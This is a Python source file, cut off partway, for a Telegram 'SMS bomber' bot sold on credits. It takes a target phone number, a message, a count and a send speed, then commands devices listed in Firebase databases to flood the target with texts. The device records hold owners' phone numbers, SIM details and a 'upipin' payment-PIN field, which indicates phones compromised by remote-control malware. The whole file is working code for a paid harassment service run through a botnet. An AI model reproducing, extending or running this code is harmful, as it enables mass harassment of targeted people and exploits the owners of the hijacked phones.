#!/usr/bin/env python3
"""
Premium Noobster Bomber Bot - Reply Keyboard Menu with Colors + Premium Emoji Icons
"""

import asyncio
import json
import logging
import sqlite3
import re
import sys
import functools
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse
from uuid import uuid4

import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    InputMediaPhoto,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger

# ---------- CONFIG ----------
TOKEN = "BOT_TOKEN"
ADMIN_IDS = [8285095915]
OWNER = "@SYNAXBABY"

FORCE_CHANNELS = [
    "@SYNAXBOTZ",
    "@SHOPSYNAX",
]

MAX_CONCURRENT_REQUESTS = 100

if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ ERROR: Bot token is not set.")
    sys.exit(1)

# ---------- LOGGING ----------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ==================================================================
# ✨ PREMIUM CUSTOM EMOJI IDS ✨
# ==================================================================
E_STAR       = "5929169225045249724"   # ⭐
E_CHECKBOX   = "5927083283983635626"   # ☑️
E_MSG        = "5440411975509096877"   # 💬
E_HEART_PURP = "5278694512510652957"   # 💜
E_ARROW      = "6073540049574564713"   # ➡️
E_TICK       = "6217634016217013626"   # ✔️
E_CROWN      = "6073371536532706028"   # 👑
E_HEART_BLUE = "6073149456658731161"   # 💙
E_MEGA       = "6071236117447842411"   # 📣

E_GLOBE      = "6188215208226329624"
E_SPARKLES   = "6188135613892399294"
E_LINK       = "5271604874419647061"
E_STATS      = "5231200819986047254"
E_USERS      = "5337080053119336309"
E_MEGAPHONE  = "5424818078833715060"
E_FILE       = "5305265301917549162"
E_BOLT       = "6188296945748938569"
E_LOCK       = "5296369303661067030"
E_PIN        = "5397782960512444700"
E_SEARCH     = "5231012545799666522"
E_GEAR       = "5341715473882955310"
E_SHIELD     = "5251203410396458957"
E_CROSS      = "5210952531676504517"
E_WARN       = "5447644880824181073"
E_REFRESH    = "5375338737028841420"
E_BOOKMARK   = "5222444124698853913"

E_MONEY      = "6188172065279840950"
E_GEM        = "6186113994261008960"
E_FIRE       = "6186121901295801546"
E_OK         = "6188206231744679914"


def tg(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


# Shortcut tags for messages
T_STAR     = tg(E_STAR,       "⭐")
T_CHECKBOX = tg(E_CHECKBOX,   "☑️")
T_MSG      = tg(E_MSG,        "💬")
T_HEART_P  = tg(E_HEART_PURP, "💜")
T_ARROW    = tg(E_ARROW,      "➡️")
T_TICK     = tg(E_TICK,       "✔️")
T_CROWN    = tg(E_CROWN,      "👑")
T_HEART_B  = tg(E_HEART_BLUE, "💙")
T_MEGA     = tg(E_MEGA,       "📣")
T_SPARKLES = tg(E_SPARKLES,   "✨")
T_LINK     = tg(E_LINK,       "🔗")
T_STATS    = tg(E_STATS,      "📊")
T_USERS    = tg(E_USERS,      "👥")
T_MEGA2    = tg(E_MEGAPHONE,  "📢")
T_FILE     = tg(E_FILE,       "📄")
T_BOLT     = tg(E_BOLT,       "⚡")
T_LOCK     = tg(E_LOCK,       "🔒")
T_PIN      = tg(E_PIN,        "📌")
T_SEARCH   = tg(E_SEARCH,     "🔍")
T_GEAR     = tg(E_GEAR,       "⚙️")
T_SHIELD   = tg(E_SHIELD,     "🛡️")
T_CROSS    = tg(E_CROSS,      "❌")
T_WARN     = tg(E_WARN,       "⚠️")
T_REFRESH  = tg(E_REFRESH,    "🔄")
T_BOOKMARK = tg(E_BOOKMARK,   "🔖")
T_MONEY    = tg(E_MONEY,      "💰")
T_GEM      = tg(E_GEM,        "💎")
T_FIRE     = tg(E_FIRE,       "🔥")
T_OK       = tg(E_OK,         "✅")

LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━"
LINE_THIN = "─────────────────────"

# ==================================================================
# ASYNC HTTP CLIENT
# ==================================================================
_http_client = None
_http_semaphore = None


def get_http_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0),
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=100),
        )
    return _http_client


def get_http_semaphore() -> asyncio.Semaphore:
    global _http_semaphore
    if _http_semaphore is None:
        _http_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _http_semaphore


async def check_channel_membership(user_id: int, bot) -> Tuple[bool, List[str]]:
    missing = []
    for channel in FORCE_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status in ["left", "kicked"]:
                missing.append(channel)
        except Exception:
            missing.append(channel)
    return (len(missing) == 0, missing)


def get_join_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for ch in FORCE_CHANNELS:
        buttons.append([
            InlineKeyboardButton(
                f"Join {ch}",
                url=f"https://t.me/{ch.lstrip('@')}",
                icon_custom_emoji_id=E_LINK,
            )
        ])
    buttons.append([
        InlineKeyboardButton(
            "I've Joined",
            callback_data="check_join",
            icon_custom_emoji_id=E_TICK,
        )
    ])
    return InlineKeyboardMarkup(buttons)


# ---------- DATABASE ----------
DB_PATH = "bomber.db"


def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.execute("PRAGMA busy_timeout=5000")
    return conn


def init_db():
    conn = _connect()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    c.execute("""CREATE TABLE IF NOT EXISTS firebases (
        id TEXT PRIMARY KEY, url TEXT NOT NULL, secret TEXT NOT NULL,
        added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    c.execute("""CREATE TABLE IF NOT EXISTS jobs (
        id TEXT PRIMARY KEY, target TEXT NOT NULL, message TEXT NOT NULL,
        devices_used INTEGER, success_count INTEGER, fail_count INTEGER,
        status TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        scheduled_for TIMESTAMP, started_at TIMESTAMP, finished_at TIMESTAMP,
        firebase_ids TEXT, chat_id INTEGER, total_sms INTEGER, delay REAL,
        credit_used INTEGER, user_id INTEGER)""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0)""")
    c.execute("""CREATE TABLE IF NOT EXISTS keys (
        key_string TEXT PRIMARY KEY, credits INTEGER NOT NULL, max_uses INTEGER NOT NULL,
        used_count INTEGER DEFAULT 0, created_by INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    c.execute("""CREATE TABLE IF NOT EXISTS redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, key_string TEXT, user_id INTEGER,
        redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("PRAGMA table_info(jobs)")
    columns = [row[1] for row in c.fetchall()]
    if "total_sms" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN total_sms INTEGER")
    if "delay" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN delay REAL")
    if "credit_used" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN credit_used INTEGER")
    if "user_id" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN user_id INTEGER")

    conn.commit()
    conn.close()


init_db()


# ---------- DB HELPERS ----------
def db_get_firebases() -> Dict[str, Dict]:
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT id, url, secret FROM firebases")
    rows = c.fetchall(); conn.close()
    return {row[0]: {"url": row[1], "secret": row[2]} for row in rows}


def db_add_firebase(fid, url, secret=""):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO firebases (id, url, secret) VALUES (?,?,?)", (fid, url, secret))
    conn.commit(); conn.close()


def db_delete_firebase(fid):
    conn = _connect(); c = conn.cursor()
    c.execute("DELETE FROM firebases WHERE id=?", (fid,))
    conn.commit(); conn.close()


def db_add_job(job_id, target, message, firebase_ids, chat_id, total_sms, delay, user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO jobs (id, target, message, status, firebase_ids, chat_id, total_sms, delay, user_id) VALUES (?,?,?,?,?,?,?,?,?)",
              (job_id, target, message, "pending", ",".join(firebase_ids), chat_id, total_sms, delay, user_id))
    conn.commit(); conn.close(); return job_id


def db_update_job(job_id, **kwargs):
    conn = _connect(); c = conn.cursor()
    fields, vals = [], []
    for k, v in kwargs.items():
        fields.append(f"{k}=?"); vals.append(v)
    vals.append(job_id)
    c.execute(f"UPDATE jobs SET {','.join(fields)} WHERE id=?", vals)
    conn.commit(); conn.close()


def db_get_jobs(limit=20, user_id=None):
    conn = _connect(); conn.row_factory = sqlite3.Row; c = conn.cursor()
    if user_id is not None:
        c.execute("SELECT * FROM jobs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
    else:
        c.execute("SELECT * FROM jobs ORDER BY created_at DESC LIMIT ?", (limit,))
    rows = c.fetchall(); conn.close()
    return [dict(row) for row in rows]


# ---------- CREDITS ----------
def get_user_credits(user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone(); conn.close()
    if row:
        return row[0]
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
    conn.commit(); conn.close(); return 0


def update_user_credits(user_id, delta):
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (delta, user_id))
    conn.commit(); conn.close()


def deduct_credits(user_id, amount):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
        conn.commit()
        c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone()
    if row[0] >= amount:
        c.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (amount, user_id))
        conn.commit(); conn.close(); return True
    conn.close(); return False


# ---------- KEYS ----------
def generate_key_string(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def db_add_key(k, credits, max_uses, created_by):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO keys (key_string, credits, max_uses, created_by) VALUES (?,?,?,?)",
              (k, credits, max_uses, created_by))
    conn.commit(); conn.close()


def db_redeem_key(key_string, user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits, max_uses, used_count FROM keys WHERE key_string=?", (key_string,))
    row = c.fetchone()
    if not row:
        conn.close(); return False
    credits, max_uses, used_count = row
    if used_count >= max_uses:
        conn.close(); return False
    c.execute("SELECT 1 FROM redemptions WHERE key_string=? AND user_id=?", (key_string, user_id))
    if c.fetchone():
        conn.close(); return False
    c.execute("UPDATE keys SET used_count = used_count + 1 WHERE key_string=?", (key_string,))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, credits))
    c.execute("INSERT INTO redemptions (key_string, user_id) VALUES (?,?)", (key_string, user_id))
    conn.commit(); conn.close(); return True


# ---------- FIREBASE ----------
async def firebase_request(url, method="GET", payload=None, timeout=15):
    raw = url.rstrip("/"); query = ""
    if "?" in raw:
        raw, query = raw.split("?", 1)
    if raw.endswith(".json"):
        raw = raw[:-5]
    raw = raw.rstrip("/")
    parsed = urlparse(raw)
    full_url = f"{raw}.json" if parsed.path else f"{raw}/.json"
    if query:
        full_url += f"?{query}"
    client = get_http_client()
    try:
        async with get_http_semaphore():
            if method == "GET": resp = await client.get(full_url)
            elif method == "PUT": resp = await client.put(full_url, json=payload)
            elif method == "POST": resp = await client.post(full_url, json=payload)
            elif method == "DELETE": resp = await client.delete(full_url)
            else: raise ValueError("Unsupported")
            resp.raise_for_status()
            try: return resp.json()
            except json.JSONDecodeError: return {"_raw": resp.text}
    except httpx.HTTPStatusError as e:
        status = e.response.status_code
        try: err_data = e.response.json() if e.response is not None else {}
        except: err_data = {"error": str(e)}
        return {"_error": True, "status": status, "message": err_data.get("error", str(e))}
    except httpx.ConnectError:
        return {"_error": True, "status": 0, "message": "Connection failed."}
    except httpx.TimeoutException:
        return {"_error": True, "status": 0, "message": "Request timed out."}
    except Exception as e:
        return {"_error": True, "status": 0, "message": str(e)}


async def get_online_devices(url):
    base = url.rstrip("/")
    if base.endswith(".json"): base = base[:-5]
    base = base.rstrip("/")
    clients_url = f"{base}/clients.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().get(clients_url)
            resp.raise_for_status()
            clients = resp.json()
    except Exception as e:
        logger.error(f"get_online_devices: {e}")
        return []
    if not isinstance(clients, dict): return []
    online = []
    for did, info in clients.items():
        if info.get("status") is True:
            online.append({
                "id": did, "name": info.get("modelName", did),
                "phone": info.get("mobNo", "N/A"), "battery": info.get("battery", "N/A"),
                "provider": info.get("service_provider", ""),
                "sims": info.get("sims", []), "upipin": info.get("upipin", ""),
                "lastSeen": info.get("lastSeen"),
            })
    return online


async def send_sms_via_device(url, device_id, sim_index, target, message):
    payload = {"from": sim_index, "to": target, "message": message,
               "isSended": False, "timestamp": datetime.now().isoformat()}
    path = f"clients/{device_id}/webhookEvent/sendSms"
    put_url = f"{url.rstrip('/')}/{path}.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().put(put_url, json=payload)
            resp.raise_for_status()
        return True
    except Exception as e:
        logger.error(f"Send failed {device_id}: {e}")
        return False


# ---------- GLOBALS ----------
running_jobs = {}
progress_messages = {}
BOT = None


def set_bot(bot):
    global BOT
    BOT = bot


# ---------- BOMB ENGINE ----------
async def execute_bomb_job(job_id, target, message, firebase_ids, total_sms, delay, user_id, schedule_time=None):
    if schedule_time and schedule_time > datetime.now():
        scheduler = AsyncIOScheduler()
        scheduler.add_job(execute_bomb_job, trigger=DateTrigger(run_date=schedule_time),
                          args=[job_id, target, message, firebase_ids, total_sms, delay, user_id, None],
                          id=job_id, replace_existing=True)
        scheduler.start()
        db_update_job(job_id, status="scheduled", scheduled_for=schedule_time.isoformat())
        return

    db_update_job(job_id, status="running", started_at=datetime.now().isoformat())
    if not deduct_credits(user_id, total_sms):
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error="Insufficient credits")
        return

    all_devices = []
    firebases = db_get_firebases()
    for fid in [f for f in firebase_ids if f in firebases]:
        url = firebases[fid]["url"]
        devices = await get_online_devices(url)
        for dev in devices:
            all_devices.append((fid, dev, url))

    if not all_devices:
        update_user_credits(user_id, total_sms)
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error="No online devices")
        return

    num_devices = len(all_devices)
    sms_per_device = total_sms // num_devices
    remainder = total_sms % num_devices
    assignments = []
    for i, (fid, dev, url) in enumerate(all_devices):
        count = sms_per_device + (1 if i < remainder else 0)
        if count > 0:
            assignments.append((fid, dev, url, count))

    total_attempts = sum(c for _, _, _, c in assignments)
    success = 0; fail = 0
    await send_progress_update(job_id, 0, total=total_attempts, success=0, fail=0)

    idx = 0
    for fid, dev, url, count in assignments:
        sims = dev.get("sims", [])
        sim_index = 1 if sims else 1
        for _ in range(count):
            ok = await send_sms_via_device(url, dev["id"], sim_index, target, message)
            if ok: success += 1
            else: fail += 1
            idx += 1
            await send_progress_update(job_id, idx, total=total_attempts, success=success, fail=fail)
            await asyncio.sleep(delay)

    if fail > 0: update_user_credits(user_id, fail)
    db_update_job(job_id, status="completed", finished_at=datetime.now().isoformat(),
                  devices_used=num_devices, success_count=success, fail_count=fail, credit_used=success)
    await send_progress_update(job_id, total_attempts, total=total_attempts, success=success, fail=fail, finished=True)
    running_jobs.pop(job_id, None); progress_messages.pop(job_id, None)


async def send_progress_update(job_id, done, total, success, fail, finished=False, error=None):
    if BOT is None: return
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT chat_id, target, user_id FROM jobs WHERE id=?", (job_id,))
    row = c.fetchone(); conn.close()
    if not row: return
    chat_id, target, user_id = row
    credits = get_user_credits(user_id) if user_id else 0

    percent = 0 if total == 0 else int((done / total) * 100)
    bar_length = 20
    filled = int(bar_length * percent / 100)
    bar = "▰" * filled + "▱" * (bar_length - filled)

    if error: status_text = f"{T_CROSS} <b>Error:</b> {error}"
    elif finished: status_text = f"{T_TICK} <b>Completed</b>"
    else: status_text = f"{T_REFRESH} <b>Running</b>"

    text = (
        f"╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_FIRE} <b>BOMB IN PROGRESS</b> {T_FIRE}\n"
        f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_BOOKMARK} <b>Job ID:</b> <code>{job_id}</code>\n"
        f"{T_PIN} <b>Target:</b> <code>{target}</code>\n"
        f"{LINE}\n"
        f"<code>{bar}</code>\n"
        f"         <b>{percent}%</b>\n"
        f"{LINE}\n\n"
        f"{T_TICK} <b>Sent:</b> {success}   {T_CROSS} <b>Failed:</b> {fail}\n"
        f"{T_HEART_P} <b>Credits:</b> {credits}\n"
        f"{T_SPARKLES} <b>Status:</b> {status_text}"
    )

    if job_id in progress_messages:
        try:
            await BOT.edit_message_text(text, chat_id=chat_id,
                message_id=progress_messages[job_id], parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.warning(f"edit progress: {e}")
    else:
        try:
            msg = await BOT.send_message(chat_id, text, parse_mode=ParseMode.HTML)
            progress_messages[job_id] = msg.message_id
        except Exception as e:
            logger.warning(f"send progress: {e}")


# ==================================================================
# 🎯 REPLY KEYBOARD MAIN MENU (Colors + Premium Emoji Icons)
# ==================================================================
(TARGET, MESSAGE, SMS_COUNT, SPEED, SCHEDULE) = range(5)


# Button labels (MUST match in handler)
BTN_LAUNCH_BOMB = "Launch Bomb"
BTN_BALANCE     = "Balance"
BTN_STATUS      = "Status"
BTN_HISTORY     = "History"
BTN_REDEEM_KEY  = "Redeem Key"
BTN_ONLINE_DEV  = "Online Devices"
BTN_STATS_HIST  = "Stats & History"
BTN_MANAGE_FB   = "Manage Firebases"
BTN_GEN_KEY     = "Generate Key"


def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    """
    Reply keyboard with REAL colors (style) + Premium Custom Emoji icons.
    style options: 'primary' (blue), 'success' (green), 'danger' (red)
    """
    if user_id in ADMIN_IDS:
        keyboard = [
            [
                KeyboardButton(BTN_LAUNCH_BOMB, style='danger',  icon_custom_emoji_id=E_FIRE),
                KeyboardButton(BTN_BALANCE,     style='success', icon_custom_emoji_id=E_MONEY),
            ],
            [
                KeyboardButton(BTN_STATUS,      style='primary', icon_custom_emoji_id=E_STATS),
                KeyboardButton(BTN_HISTORY,     style='primary', icon_custom_emoji_id=E_BOOKMARK),
            ],
            [
                KeyboardButton(BTN_REDEEM_KEY,  style='success', icon_custom_emoji_id=E_CHECKBOX),
            ],
            [
                KeyboardButton(BTN_ONLINE_DEV,  style='primary', icon_custom_emoji_id=E_BOLT),
                KeyboardButton(BTN_STATS_HIST,  style='primary', icon_custom_emoji_id=E_STATS),
            ],
            [
                KeyboardButton(BTN_MANAGE_FB,   style='primary', icon_custom_emoji_id=E_GEAR),
                KeyboardButton(BTN_GEN_KEY,     style='success', icon_custom_emoji_id=E_CROWN),
            ],
        ]
    else:
        keyboard = [
            [
                KeyboardButton(BTN_LAUNCH_BOMB, style='danger',  icon_custom_emoji_id=E_FIRE),
                KeyboardButton(BTN_BALANCE,     style='success', icon_custom_emoji_id=E_MONEY),
            ],
            [
                KeyboardButton(BTN_STATUS,      style='primary', icon_custom_emoji_id=E_STATS),
                KeyboardButton(BTN_HISTORY,     style='primary', icon_custom_emoji_id=E_BOOKMARK),
            ],
            [
                KeyboardButton(BTN_REDEEM_KEY,  style='success', icon_custom_emoji_id=E_CHECKBOX),
            ],
        ]

    return ReplyKeyboardMarkup(
        keyboard,
        resize_keyboard=True,
        is_persistent=True,
    )


USER_BUTTONS = [BTN_LAUNCH_BOMB, BTN_BALANCE, BTN_STATUS, BTN_HISTORY, BTN_REDEEM_KEY]
ADMIN_BUTTONS = [BTN_ONLINE_DEV, BTN_STATS_HIST, BTN_MANAGE_FB, BTN_GEN_KEY]
ALL_BUTTONS = USER_BUTTONS + ADMIN_BUTTONS


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🏓 <b>Pong!</b> {T_BOLT} <i>Bot is fast & online.</i>",
        parse_mode=ParseMode.HTML
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name or "User"
    get_user_credits(user_id)

    joined, missing = await check_channel_membership(user_id, context.bot)
    if not joined:
        text = (
            "╭━━━━━━━━━━━━━━━━━━╮\n"
            f"   {T_CROWN} <b>ACCESS RESTRICTED</b> {T_CROWN}\n"
            "╰━━━━━━━━━━━━━━━━━━╯\n\n"
            f"{T_WARN} <b>Please join all channels to use this bot</b>\n\n"
            f"{T_CROWN} <b>Owner:</b> {OWNER}\n"
            f"{LINE}\n\n"
            f"{T_ARROW} Join the channels below, then tap <b>I've Joined</b>:"
        )
        await update.message.reply_text(
            text,
            reply_markup=get_join_keyboard(),
            parse_mode=ParseMode.HTML,
        )
        return

    credits = get_user_credits(user_id)
    is_admin = user_id in ADMIN_IDS
    role = f"{T_CROWN} <b>ADMIN</b>" if is_admin else f"{T_STAR} <b>USER</b>"

    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_FIRE} <b>PREMIUM XIPHER BOMBER</b> {T_FIRE}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_SPARKLES} <b>Welcome, {first_name}!</b>\n\n"
        f"{T_STAR} <b>User ID:</b> <code>{user_id}</code>\n"
        f"{T_HEART_P} <b>Credits:</b> {credits}\n"
        f"{T_TICK} <b>Status:</b> Active\n"
        f"{T_CROWN} <b>Role:</b> {role}\n"
        f"{T_GEAR} <b>Owner:</b> {OWNER}\n\n"
        f"{LINE}\n"
        f"{T_BOLT} <b>Server:</b> Ultra-Fast Async\n"
        f"{T_USERS} <b>Multi-User:</b> Unlimited\n"
        f"{T_SHIELD} <b>Status:</b> {T_OK} Online\n"
        f"{LINE}\n\n"
        f"{T_MEGA} Use the keyboard below to navigate ✨"
    )

    await update.message.reply_text(
        text,
        reply_markup=get_main_keyboard(user_id),
        parse_mode=ParseMode.HTML,
    )


# ---------- CALLBACK HANDLER ----------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if data == "check_join":
        joined, missing = await check_channel_membership(user_id, BOT)
        if joined:
            await query.edit_message_text(
                f"{T_TICK} <b>All channels joined!</b>\n{T_SPARKLES} Welcome to Premium Xipher Bomber.",
                parse_mode=ParseMode.HTML
            )
            credits = get_user_credits(user_id)
            is_admin = user_id in ADMIN_IDS
            role = f"{T_CROWN} <b>ADMIN</b>" if is_admin else f"{T_STAR} <b>USER</b>"
            text = (
                "╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_FIRE} <b>PREMIUM XIPHER BOMBER</b> {T_FIRE}\n"
                "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_STAR} <b>User ID:</b> <code>{user_id}</code>\n"
                f"{T_HEART_P} <b>Credits:</b> {credits}\n"
                f"{T_CROWN} <b>Role:</b> {role}\n"
                f"{T_GEAR} <b>Owner:</b> {OWNER}\n\n"
                f"{LINE}\n"
                f"{T_BOLT} <b>Server:</b> Ultra-Fast Async\n"
                f"{T_USERS} <b>Multi-User:</b> Unlimited\n"
                f"{T_SHIELD} <b>Status:</b> {T_OK} Online\n"
                f"{LINE}\n\n"
                f"{T_MEGA} Use the keyboard below to navigate ✨"
            )
            await query.message.reply_text(
                text,
                reply_markup=get_main_keyboard(user_id),
                parse_mode=ParseMode.HTML,
            )
        else:
            ch_list = "\n".join([f"• {ch}" for ch in missing])
            await query.edit_message_text(
                f"{T_CROSS} <b>You haven't joined all channels yet!</b>\n\n"
                f"{T_WARN} Missing:\n{ch_list}\n\n"
                f"Please join and click {T_TICK} I've Joined again.",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.HTML
            )
        return


# ---------- CONVERSATION: BOMB WIZARD ----------
async def bomb_wizard_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_FIRE} <b>LAUNCH BOMB</b> {T_FIRE}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_MSG} Please enter the target phone number\n"
        f"{T_PIN} Format: <code>919876543210</code>\n\n"
        f"{T_CROSS} Type /cancel to abort."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    return TARGET


async def bomb_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(f"{T_CROSS} Please enter a valid numeric phone number.", parse_mode=ParseMode.HTML)
        return TARGET
    context.user_data["target"] = text
    await update.message.reply_text(
        f"{T_TICK} <b>Target saved:</b> <code>{text}</code>\n\n"
        f"{T_MSG} Now enter the <b>message</b> you want to send:",
        parse_mode=ParseMode.HTML
    )
    return MESSAGE


async def bomb_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END

    context.user_data["message"] = text
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    await update.message.reply_text(
        f"{T_TICK} <b>Message saved!</b>\n\n"
        f"{T_MSG} How many SMS do you want to send?\n"
        f"{T_HEART_P} Your credits: <b>{credits}</b>\n"
        f"{T_SPARKLES} 1 SMS = 1 credit\n\n"
        f"{T_ARROW} Enter a number:",
        parse_mode=ParseMode.HTML
    )
    return SMS_COUNT


async def bomb_sms_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END

    try:
        count = int(text)
        if count <= 0: raise ValueError
    except:
        await update.message.reply_text(f"{T_CROSS} Please enter a positive integer.", parse_mode=ParseMode.HTML)
        return SMS_COUNT

    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    if count > credits:
        await update.message.reply_text(
            f"{T_WARN} You have only <b>{credits}</b> credits.\n"
            f"{T_PIN} Please enter a number up to <b>{credits}</b> or /cancel.",
            parse_mode=ParseMode.HTML
        )
        return SMS_COUNT
    context.user_data["sms_count"] = count

    keyboard = [
        [InlineKeyboardButton("Slow (1s)", callback_data="speed_slow", icon_custom_emoji_id=E_HEART_PURP)],
        [InlineKeyboardButton("Medium (0.5s)", callback_data="speed_medium", icon_custom_emoji_id=E_STAR)],
        [InlineKeyboardButton("Fast (0.1s)", callback_data="speed_fast", icon_custom_emoji_id=E_BOLT)],
        [InlineKeyboardButton("Lightning (0.02s)", callback_data="speed_lightning", icon_custom_emoji_id=E_FIRE)],
    ]
    await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_BOLT} <b>SELECT SPEED</b> {T_BOLT}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_ARROW} Choose sending speed:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.HTML
    )
    return SPEED


async def bomb_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    delay_map = {"speed_slow": 1.0, "speed_medium": 0.5, "speed_fast": 0.1, "speed_lightning": 0.02}
    delay = delay_map.get(data, 0.5)
    context.user_data["delay"] = delay
    await query.message.reply_text(
        f"{T_TICK} Delay set to <b>{delay}s</b>.\n\n"
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_PIN} <b>SCHEDULE</b> {T_PIN}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_MSG} Send date/time in format <code>YYYY-MM-DD HH:MM</code>\n"
        f"{T_ARROW} Or type <code>now</code> to send immediately.",
        parse_mode=ParseMode.HTML
    )
    return SCHEDULE


async def bomb_schedule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END

    try:
        if text == "now":
            schedule_time = None
        else:
            try:
                schedule_time = datetime.strptime(text, "%Y-%m-%d %H:%M")
                if schedule_time <= datetime.now():
                    await update.message.reply_text(f"{T_WARN} Scheduled time must be in the future.", parse_mode=ParseMode.HTML)
                    return SCHEDULE
            except ValueError:
